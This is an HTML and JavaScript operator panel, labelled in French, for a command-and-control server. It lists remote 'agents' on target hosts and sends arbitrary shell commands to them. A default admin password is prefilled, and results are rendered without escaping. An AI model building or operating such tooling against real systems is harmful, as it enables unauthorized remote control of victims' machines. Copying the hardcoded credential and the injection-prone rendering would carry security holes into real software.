<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Admin Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f1419;
            color: #e1e8ed;
            min-height: 100vh;
        }
        
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f1419 0%, #1a1f2e 100%);
        }
        
        .login-form {
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            min-width: 400px;
        }
        
        .admin-panel {
            display: none;
            padding: 20px;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #4ecdc4;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        .panel-section {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            padding: 20px;
        }
        
        .agents-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .agent-item {
            background: rgba(0, 0, 0, 0.3);
            margin: 10px 0;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #4ecdc4;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .agent-item:hover {
            background: rgba(0, 0, 0, 0.5);
        }
        
        .agent-item.offline {
            border-left-color: #ff6b6b;
            opacity: 0.7;
        }
        
        .command-section {
            margin-top: 20px;
        }
        
        .command-input {
            width: 100%;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #e1e8ed;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        
        .btn {
            background: linear-gradient(45deg, #4ecdc4, #45b7d1);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(78, 205, 196, 0.3);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ff4757);
        }
        
        .command-history {
            max-height: 300px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
            padding: 10px;
            margin-top: 10px;
        }
        
        .command-item {
            margin: 5px 0;
            padding: 8px;
            border-radius: 3px;
            background: rgba(255, 255, 255, 0.05);
        }
        
        .command-item.pending {
            border-left: 3px solid #f39c12;
        }
        
        .command-item.completed {
            border-left: 3px solid #27ae60;
        }
        
        .command-item.failed {
            border-left: 3px solid #e74c3c;
        }
        
        .status-online {
            color: #4ecdc4;
            font-weight: bold;
        }
        
        .status-offline {
            color: #ff6b6b;
            font-weight: bold;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #4ecdc4;
        }
        
        .input-group input {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            color: #e1e8ed;
        }
        
        .error {
            color: #ff6b6b;
            margin-top: 10px;
        }
        
        .notifications {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        
        .notification {
            background: rgba(78, 205, 196, 0.9);
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 10px;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
    </style>
</head>
<body>
    <div id="loginContainer" class="login-container">
        <div class="login-form">
            <h2 style="text-align: center; margin-bottom: 30px; color: #4ecdc4;">üîê C2 Admin Login</h2>
            <div class="input-group">
                <label for="username">Username:</label>
                <input type="text" id="username" value="admin">
            </div>
            <div class="input-group">
                <label for="password">Password:</label>
                <input type="password" id="password" value="C2Admin123!">
            </div>
            <button onclick="login()" class="btn" style="width: 100%;">Se connecter</button>
            <div id="loginError" class="error"></div>
        </div>
    </div>

    <div id="adminPanel" class="admin-panel">
        <div class="header">
            <h1>üéØ C2 Admin Panel</h1>
            <div>
                <span id="username-display"></span>
                <button onclick="logout()" class="btn btn-danger">D√©connexion</button>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalAgents">0</div>
                <div>Total Agents</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineAgents">0</div>
                <div>Agents En Ligne</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="pendingCommands">0</div>
                <div>Commandes En Attente</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="commandsToday">0</div>
                <div>Commandes Aujourd'hui</div>
            </div>
        </div>

        <div class="main-content">
            <div class="panel-section">
                <h3>üì° Gestion des Agents</h3>
                
                <!-- Bouton pour ajouter un agent -->
                <div style="margin-bottom: 15px;">
                    <button onclick="showAddAgentForm()" class="btn">‚ûï Ajouter un Agent</button>
                    <button onclick="loadAgents()" class="btn">üîÑ Actualiser</button>
                </div>
                
                <!-- Formulaire d'ajout d'agent (cach√© par d√©faut) -->
                <div id="addAgentForm" style="display: none; background: rgba(0,0,0,0.3); padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                    <h4>‚ûï Ajouter un Nouvel Agent</h4>
                    <div class="input-group">
                        <label for="newHostname">Hostname:</label>
                        <input type="text" id="newHostname" placeholder="ex: target-server">
                    </div>
                    <div class="input-group">
                        <label for="newUsername">Username:</label>
                        <input type="text" id="newUsername" placeholder="ex: administrator">
                    </div>
                    <div class="input-group">
                        <label for="newOsInfo">OS Info:</label>
                        <input type="text" id="newOsInfo" placeholder="ex: Windows 10 Pro">
                    </div>
                    <div class="input-group">
                        <label for="newIpAddress">IP Address:</label>
                        <input type="text" id="newIpAddress" placeholder="ex: 192.168.1.100">
                    </div>
                    <div class="input-group">
                        <label for="newCapabilities">Capacit√©s (optionnel):</label>
                        <input type="text" id="newCapabilities" placeholder="ex: cmd,powershell,file_ops">
                    </div>
                    <div style="margin-top: 15px;">
                        <button onclick="addAgent()" class="btn">‚úÖ Ajouter Agent</button>
                        <button onclick="hideAddAgentForm()" class="btn btn-danger">‚ùå Annuler</button>
                    </div>
                    <div id="addAgentError" class="error"></div>
                </div>
                
                <div id="agentsList" class="agents-list">
                    <!-- Agents seront list√©s ici -->
                </div>
            </div>

            <div class="panel-section">
                <h3>‚ö° Contr√¥le des Agents</h3>
                <div id="selectedAgent">
                    <p>S√©lectionnez un agent pour envoyer des commandes</p>
                </div>
                
                <div id="commandSection" class="command-section" style="display: none;">
                    <h4>Envoyer une commande:</h4>
                    <input type="text" id="commandInput" class="command-input" placeholder="Entrez votre commande...">
                    <button onclick="sendCommand()" class="btn">Envoyer</button>
                    
                    <h4>Commandes pr√©d√©finies:</h4>
                    <button onclick="sendPredefinedCommand('whoami')" class="btn">whoami</button>
                    <button onclick="sendPredefinedCommand('pwd')" class="btn">pwd</button>
                    <button onclick="sendPredefinedCommand('ls -la')" class="btn">ls -la</button>
                    <button onclick="sendPredefinedCommand('ps aux')" class="btn">ps aux</button>
                    
                    <div id="commandHistory" class="command-history">
                        <!-- Historique des commandes -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="notifications" class="notifications"></div>

    <script>
        let socket;
        let currentAgentId = null;
        let authToken = null;

        // Fonction de login
        async function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            try {
                const response = await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    authToken = data.access_token;
                    document.getElementById('username-display').textContent = data.username;
                    document.getElementById('loginContainer').style.display = 'none';
                    document.getElementById('adminPanel').style.display = 'block';
                    
                    // Initialiser WebSocket
                    initializeWebSocket();
                    
                    // Charger les donn√©es
                    loadAgents();
                    loadStats();
                    
                    // Actualiser p√©riodiquement
                    setInterval(() => {
                        loadAgents();
                        loadStats();
                    }, 10000);
                } else {
                    document.getElementById('loginError').textContent = data.error;
                }
            } catch (error) {
                document.getElementById('loginError').textContent = 'Erreur de connexion';
            }
        }

        // Initialiser WebSocket
        function initializeWebSocket() {
            socket = io();
            
            socket.on('connect', function() {
                console.log('WebSocket connect√©');
                socket.emit('join_admin');
            });
            
            socket.on('agent_online', function(data) {
                showNotification(`Agent connect√©: ${data.agent_id}`);
                loadAgents();
            });
            
            socket.on('command_result', function(data) {
                showNotification(`R√©sultat re√ßu de ${data.agent_id}`);
                if (currentAgentId === data.agent_id) {
                    loadCommandHistory(currentAgentId);
                }
            });
        }

        // Charger la liste des agents
        async function loadAgents() {
            try {
                const response = await fetch('/api/agents', {
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                    },
                });
                
                const data = await response.json();
                displayAgents(data.agents);
            } catch (error) {
                console.error('Erreur lors du chargement des agents:', error);
            }
        }

        // Afficher les agents
        function displayAgents(agents) {
            const agentsList = document.getElementById('agentsList');
            agentsList.innerHTML = '';
            
            agents.forEach(agent => {
                const agentDiv = document.createElement('div');
                agentDiv.className = `agent-item ${agent.online ? 'online' : 'offline'}`;
                agentDiv.onclick = () => selectAgent(agent);
                
                // Badge pour les agents ajout√©s manuellement
                const statusBadge = agent.status === 'manual' ? 
                    '<span style="background: #f39c12; color: white; padding: 2px 6px; border-radius: 3px; font-size: 10px; margin-left: 5px;">MANUEL</span>' : '';
                
                agentDiv.innerHTML = `
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <div>
                            <strong>${agent.hostname}</strong> (${agent.username}) ${statusBadge}
                            <br>
                            <small>${agent.os_info} - ${agent.ip_address}</small>
                            <br>
                            <small>Premi√®re vue: ${agent.first_seen} | Derni√®re vue: ${agent.last_seen}</small>
                        </div>
                        <div style="display: flex; flex-direction: column; align-items: end;">
                            <div class="${agent.online ? 'status-online' : 'status-offline'}">
                                ${agent.online ? 'üü¢ En ligne' : 'üî¥ Hors ligne'}
                            </div>
                            <button onclick="deleteAgent('${agent.id}', '${agent.hostname}'); event.stopPropagation();" 
                                    class="btn btn-danger" style="margin-top: 5px; padding: 2px 8px; font-size: 12px;">
                                üóëÔ∏è Supprimer
                            </button>
                        </div>
                    </div>
                `;
                
                agentsList.appendChild(agentDiv);
            });
        }

        // Afficher le formulaire d'ajout d'agent
        function showAddAgentForm() {
            document.getElementById('addAgentForm').style.display = 'block';
            document.getElementById('newHostname').focus();
        }

        // Masquer le formulaire d'ajout d'agent
        function hideAddAgentForm() {
            document.getElementById('addAgentForm').style.display = 'none';
            // R√©initialiser le formulaire
            document.getElementById('newHostname').value = '';
            document.getElementById('newUsername').value = '';
            document.getElementById('newOsInfo').value = '';
            document.getElementById('newIpAddress').value = '';
            document.getElementById('newCapabilities').value = '';
            document.getElementById('addAgentError').textContent = '';
        }

        // Ajouter un nouvel agent
        async function addAgent() {
            const hostname = document.getElementById('newHostname').value.trim();
            const username = document.getElementById('newUsername').value.trim();
            const osInfo = document.getElementById('newOsInfo').value.trim();
            const ipAddress = document.getElementById('newIpAddress').value.trim();
            const capabilities = document.getElementById('newCapabilities').value.trim();
            
            // Validation
            if (!hostname || !username || !osInfo || !ipAddress) {
                document.getElementById('addAgentError').textContent = 'Tous les champs sont requis (sauf capacit√©s)';
                return;
            }
            
            // Validation IP basique
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipAddress)) {
                document.getElementById('addAgentError').textContent = 'Format d\'IP invalide';
                return;
            }
            
            // Pr√©parer les capacit√©s
            const capabilitiesArray = capabilities ? capabilities.split(',').map(c => c.trim()) : ['manual_entry'];
            
            try {
                const response = await fetch('/api/agents', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${authToken}`,
                    },
                    body: JSON.stringify({
                        hostname: hostname,
                        username: username,
                        os_info: osInfo,
                        ip_address: ipAddress,
                        capabilities: capabilitiesArray
                    })
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    showNotification(`‚úÖ Agent ajout√©: ${hostname} (${ipAddress})`);
                    hideAddAgentForm();
                    loadAgents(); // Recharger la liste
                } else {
                    document.getElementById('addAgentError').textContent = result.error || 'Erreur lors de l\'ajout';
                }
                
            } catch (error) {
                document.getElementById('addAgentError').textContent = 'Erreur de connexion';
                console.error('Erreur:', error);
            }
        }

        // Supprimer un agent
        async function deleteAgent(agentId, hostname) {
            if (!confirm(`√ätes-vous s√ªr de vouloir supprimer l'agent "${hostname}" ?\n\nCela supprimera aussi tout l'historique des commandes.`)) {
                return;
            }
            
            try {
                const response = await fetch(`/api/agents/${agentId}`, {
                    method: 'DELETE',
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                    }
                });
                
                const result = await response.json();
                
                if (response.ok) {
                    showNotification(`üóëÔ∏è Agent supprim√©: ${hostname}`);
                    loadAgents(); // Recharger la liste
                    
                    // Si l'agent supprim√© √©tait s√©lectionn√©, d√©selectionner
                    if (currentAgentId === agentId) {
                        currentAgentId = null;
                        document.getElementById('selectedAgent').innerHTML = '<p>S√©lectionnez un agent pour envoyer des commandes</p>';
                        document.getElementById('commandSection').style.display = 'none';
                    }
                } else {
                    showNotification(`‚ùå Erreur: ${result.error}`, 'error');
                }
                
            } catch (error) {
                showNotification('‚ùå Erreur de connexion', 'error');
                console.error('Erreur:', error);
            }
        }

        // S√©lectionner un agent
        function selectAgent(agent) {
            currentAgentId = agent.id;
            document.getElementById('selectedAgent').innerHTML = `
                <h4>Agent s√©lectionn√©: ${agent.hostname}</h4>
                <p>ID: ${agent.id}</p>
                <p>Statut: <span class="${agent.online ? 'status-online' : 'status-offline'}">${agent.online ? 'En ligne' : 'Hors ligne'}</span></p>
            `;
            
            document.getElementById('commandSection').style.display = 'block';
            loadCommandHistory(agent.id);
        }

        // Envoyer une commande
        async function sendCommand() {
            const command = document.getElementById('commandInput').value;
            if (!command || !currentAgentId) return;
            
            try {
                const response = await fetch(`/api/agents/${currentAgentId}/commands`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${authToken}`,
                    },
                    body: JSON.stringify({ command }),
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    document.getElementById('commandInput').value = '';
                    showNotification('Commande envoy√©e');
                    loadCommandHistory(currentAgentId);
                } else {
                    showNotification('Erreur: ' + data.error, 'error');
                }
            } catch (error) {
                showNotification('Erreur de connexion', 'error');
            }
        }

        // Envoyer une commande pr√©d√©finie
        function sendPredefinedCommand(command) {
            document.getElementById('commandInput').value = command;
            sendCommand();
        }

        // Charger l'historique des commandes
        async function loadCommandHistory(agentId) {
            try {
                const response = await fetch(`/api/agents/${agentId}/commands`, {
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                    },
                });
                
                const data = await response.json();
                displayCommandHistory(data.commands);
            } catch (error) {
                console.error('Erreur lors du chargement de l\'historique:', error);
            }
        }

        // Afficher l'historique des commandes
        function displayCommandHistory(commands) {
            const historyDiv = document.getElementById('commandHistory');
            historyDiv.innerHTML = '<h4>Historique des commandes:</h4>';
            
            commands.forEach(cmd => {
                const cmdDiv = document.createElement('div');
                cmdDiv.className = `command-item ${cmd.status}`;
                
                cmdDiv.innerHTML = `
                    <div><strong>${cmd.command}</strong></div>
                    <div>Statut: ${cmd.status} | ${cmd.created_at}</div>
                    ${cmd.result ? `<div style="margin-top: 5px; font-family: monospace; background: rgba(0,0,0,0.5); padding: 5px; border-radius: 3px;">${cmd.result}</div>` : ''}
                `;
                
                historyDiv.appendChild(cmdDiv);
            });
        }

        // Charger les statistiques
        async function loadStats() {
            try {
                const response = await fetch('/api/stats', {
                    headers: {
                        'Authorization': `Bearer ${authToken}`,
                    },
                });
                
                const data = await response.json();
                
                document.getElementById('totalAgents').textContent = data.agents.total;
                document.getElementById('onlineAgents').textContent = data.agents.online;
                document.getElementById('pendingCommands').textContent = data.commands.pending;
                document.getElementById('commandsToday').textContent = data.commands.today;
            } catch (error) {
                console.error('Erreur lors du chargement des stats:', error);
            }
        }

        // Afficher une notification
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            
            if (type === 'error') {
                notification.style.background = 'rgba(255, 107, 107, 0.9)';
            }
            
            document.getElementById('notifications').appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 5000);
        }

        // D√©connexion
        function logout() {
            authToken = null;
            currentAgentId = null;
            if (socket) socket.disconnect();
            document.getElementById('loginContainer').style.display = 'flex';
            document.getElementById('adminPanel').style.display = 'none';
        }

        // Actualisation automatique (seulement si connect√©)
        // Les donn√©es ne sont charg√©es qu'apr√®s connexion

        // Gestion des touches
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (document.getElementById('loginContainer').style.display !== 'none') {
                    login();
                } else if (document.activeElement === document.getElementById('commandInput')) {
                    sendCommand();
                }
            }
        });
    </script>
</body>
</html>
